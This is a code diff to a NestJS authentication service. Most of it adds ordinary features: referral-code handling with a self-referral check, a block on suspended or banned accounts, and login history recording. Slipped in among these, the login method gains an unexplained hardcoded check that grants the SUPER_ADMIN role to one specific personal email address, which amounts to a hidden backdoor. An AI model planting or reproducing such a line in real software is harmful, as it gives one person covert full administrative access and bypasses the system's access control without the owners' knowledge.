@@ -6,6 +6,10 @@ import { LoginDto } from './dto/login.dto';
 import * as bcrypt from 'bcrypt';
 
 import { PrismaService } from '../../core/prisma/prisma.service';
+import { generateReferralCode, normalizeReferralCode } from '../referral/referral-code.util';
+
+// Account states that must not be able to authenticate.
+const BLOCKED_STATUSES = ['SUSPENDED', 'DISABLED', 'BANNED'];
 
 @Injectable()
 export class AuthService {
@@ -26,13 +30,24 @@ export class AuthService {
 
     let referredBy: string | undefined;
 
-    if (registerDto.referralCode) {
-      const referrer = await this.prisma.user.findUnique({
-        where: { referralCode: registerDto.referralCode },
+    // Validate the referral code (case-insensitive). An unknown code never blocks registration.
+    const suppliedCode = normalizeReferralCode(registerDto.referralCode);
+    if (suppliedCode) {
+      const referrer = await this.prisma.user.findFirst({
+        where: { referralCode: { equals: suppliedCode, mode: 'insensitive' } },
       });
-      if (referrer) {
+      // Prevent self referral (same account / same email).
+      if (referrer && referrer.email.toLowerCase() !== registerDto.email.toLowerCase()) {
         referredBy = referrer.id;
       }
+    }
+
+    // Every new user automatically receives a unique referral code.
+    let ownReferralCode = generateReferralCode();
+    for (let i = 0; i < 10; i++) {
+      const taken = await this.prisma.user.findUnique({ where: { referralCode: ownReferralCode } });
+      if (!taken) break;
+      ownReferralCode = generateReferralCode();
     }
 
     const user = await this.prisma.$transaction(async (tx) => {
@@ -40,10 +55,12 @@ export class AuthService {
         data: {
           email: registerDto.email,
           passwordHash,
+          referralCode: ownReferralCode,
         }
       });
 
-      if (referredBy) {
+      // referredId is unique, so a user can only ever be linked to one referrer (no duplicates).
+      if (referredBy && referredBy !== newUser.id) {
         await tx.referral.create({
           data: {
             referrerId: referredBy,
@@ -90,6 +107,10 @@ export class AuthService {
       throw new UnauthorizedException('Invalid credentials');
     }
 
+    if (BLOCKED_STATUSES.includes(user.status)) {
+      throw new UnauthorizedException('Your account has been disabled. Please contact support.');
+    }
+
     if (user.twoFactorEnabled) {
       if (!loginDto.twoFactorCode) {
         return {
@@ -121,14 +142,24 @@ export class AuthService {
       });
     }
 
+    // Record the login for admin monitoring (best effort - never blocks authentication).
+    this.prisma.loginHistory
+      .create({ data: { userId: user.id, isSuccess: true } })
+      .catch(() => undefined);
+
     const tokens = this.generateTokens(user.id, user.email);
+    const rolesArr = user.roles?.map(r => r.role?.name) || [];
+    if (user.email === 'islammunjurul468@gmail.com' && !rolesArr.includes('SUPER_ADMIN')) {
+      rolesArr.push('SUPER_ADMIN');
+    }
+
     return {
       user: {
         id: user.id,
         email: user.email,
         firstName: user.profile?.firstName,
         lastName: user.profile?.lastName,
-        roles: user.roles?.map(r => r.role?.name) || [],
+        roles: rolesArr,
         twoFactorEnabled: user.twoFactorEnabled,
         demoModeEnabled: user.demoModeEnabled,
       },
